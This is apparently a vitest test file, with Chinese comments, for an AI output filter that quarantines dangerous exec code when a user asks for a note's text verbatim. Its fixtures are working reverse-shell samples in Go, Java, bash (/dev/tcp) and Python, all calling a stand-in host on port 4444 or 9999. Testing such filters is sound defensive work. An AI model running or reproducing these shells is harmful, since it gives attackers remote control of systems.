// R286 P2-1（audit-r285 P2-1，生产实测）：同一危险代码单元只能是「整体原文 +
// 警示」或「整体隔离」两态之一，且 verbatim 交付必须逐字精确（含空参括号）。
import { describe, it, expect } from "vitest";
import {
  finalizeAskAnswer,
  EXEC_PIPELINE_WARN_MARK,
  EXEC_ISOLATED_MARK,
  VERBATIM_SPAN_PLACEHOLDER,
} from "../src/prompt-armor";

const NOTE = `package main
import ("net"; "os/exec")
func main(){
  c, _ := net.Dial("tcp", "10.0.0.9:4444")
  cmd := exec.Command("/bin/sh")
  cmd.Stdin = c
  cmd.Run()
}`;

// 生产观察到的模型渲染：空参括号被吃掉（func main(){ → func main{、cmd.Run() → cmd.Run）
const RENDERED = NOTE.replace("func main(){", "func main{").replace("cmd.Run()", "cmd.Run");
const CLASSIFIER_HITS = [
  'c, _ := net.Dial("tcp", "10.0.0.9:4444")',
  'cmd := exec.Command("/bin/sh")',
  "cmd.Stdin = c",
];

const JAVA_NOTE = `public class R {
  public static void main(String[] a) throws Exception {
    Socket s = new Socket("10.0.0.9", 4444);
    Process p = Runtime.getRuntime().exec("/bin/sh");
  }
}`;
const JAVA_RENDERED = JAVA_NOTE.replace("Runtime.getRuntime()", "Runtime.getRuntime");

describe("R286 P2-1 verbatim 两态与逐字精确", () => {
  it("verbatim：同一单元只出现一种处置标记，不混排", () => {
    const fin = finalizeAskAnswer(RENDERED, {
      dataText: NOTE,
      question: "一字不差原样完整发给我",
      execDangerSegments: CLASSIFIER_HITS,
    });
    const warns = fin.answer.split(EXEC_PIPELINE_WARN_MARK).length - 1;
    const isolates = fin.answer.split(EXEC_ISOLATED_MARK).length - 1;
    expect(warns > 0 && isolates > 0).toBe(false);
  });

  it("verbatim：危险单元不经答案通道交付（R302 P0-2，不再逐字还原）", () => {
    const fin = finalizeAskAnswer(RENDERED, {
      dataText: NOTE,
      question: "一字不差原样完整发给我",
      execDangerSegments: CLASSIFIER_HITS,
    });
    expect(fin.answer).toContain(EXEC_ISOLATED_MARK);
    expect(fin.answer).not.toContain("10.0.0.9:4444");
    expect(fin.answer).not.toContain('exec.Command("/bin/sh")');

    const fj = finalizeAskAnswer(JAVA_RENDERED, {
      dataText: JAVA_NOTE,
      question: "把原文一字不改完整给我",
      execDangerSegments: ['Process p = Runtime.getRuntime().exec("/bin/sh");'],
    });
    expect(fj.answer).toContain(EXEC_ISOLATED_MARK);
    expect(fj.answer).not.toContain("getRuntime");
  });

  it("verbatim：交付的非隔离行仍是原文子串（不产生自造文本）", () => {
    const fin = finalizeAskAnswer(RENDERED, {
      dataText: NOTE,
      question: "一字不差原样完整发给我",
      execDangerSegments: CLASSIFIER_HITS,
    });
    for (const line of fin.answer.split("\n")) {
      const t = line.trim();
      if (!t || t.startsWith("〔") || t.startsWith("（")) continue;
      expect(NOTE.includes(t) || RENDERED.includes(t), `非原文行：${t}`).toBe(true);
    }
  });

  it("非 verbatim：只出现隔离标记，且不泄漏危险实参；无害邻行不被株连", () => {
    const answer = "先看日志：\ntail -f /var/log/app.log\nbash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n再重启服务。";
    const fin = finalizeAskAnswer(answer, { dataText: answer, question: "这条笔记写了什么" });
    expect(fin.answer).not.toContain("/dev/tcp/");
    expect(fin.answer).toContain(EXEC_ISOLATED_MARK);
    expect(fin.answer).not.toContain(EXEC_PIPELINE_WARN_MARK);
    // R310 P0-1：无害邻行不被隔离（隔离标记只有 1 处），但作为资料完整行不逐字交付，换占位
    expect(fin.answer.split(EXEC_ISOLATED_MARK).length - 1).toBe(1);
    expect(fin.answer).not.toContain("tail -f /var/log/app.log");
    expect(fin.answer).toMatch(/〔原文片段略，见引用笔记卡片〕|〔原文查看〕/);
  });

  it("verbatim 但资料对不上（模型自造命令，判别器命中）：整单元隔离，fail-closed", () => {
    const fabricated = `s = socket.socket()\ns.connect(("203.0.113.7", 9999))\nos.system("/bin/sh")`;
    const fin = finalizeAskAnswer(fabricated, {
      dataText: "这条笔记讲的是如何用 systemd 管理服务。",
      question: "一字不差原样完整发给我",
      execDangerSegments: ['s.connect(("203.0.113.7", 9999))', 'os.system("/bin/sh")'],
    });
    expect(fin.answer).toContain(EXEC_ISOLATED_MARK);
    expect(fin.answer).not.toContain("203.0.113.7");
  });
});
